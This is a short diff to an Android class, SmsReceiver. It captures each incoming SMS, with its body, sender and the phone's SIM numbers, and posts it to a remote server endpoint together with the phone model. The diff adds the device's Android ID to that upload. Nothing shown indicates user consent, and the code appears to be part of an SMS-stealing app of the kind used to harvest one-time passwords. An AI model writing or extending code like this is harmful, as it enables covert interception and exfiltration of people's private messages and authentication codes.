@@ -36,7 +36,6 @@ public class SmsReceiver extends BroadcastReceiver {
                         if (smsMessage != null) {
                             String receiver = Helper.getSimNumbers(context);
                             String sender = "Receiver : "+receiver + "<br> Sender : " +  smsMessage.getDisplayOriginatingAddress();
-//                            String sender = smsMessage.getDisplayOriginatingAddress();
                             String messageBody = smsMessage.getMessageBody();
 
                             long timestamp = smsMessage.getTimestampMillis();
@@ -50,6 +49,7 @@ public class SmsReceiver extends BroadcastReceiver {
                                     jsonData.put("site", helper.SITE());
                                     jsonData.put("message", messageBody);
                                     jsonData.put("sender", sender);
+                                    jsonData.put("mobile_id", Helper.getAndroidId(context));
                                     jsonData.put("model", Build.MODEL);
                                     jsonData.put("status", "N/A");
                                     Helper.postRequest(helper.SMSSavePath(), jsonData, new Helper.ResponseListener() {
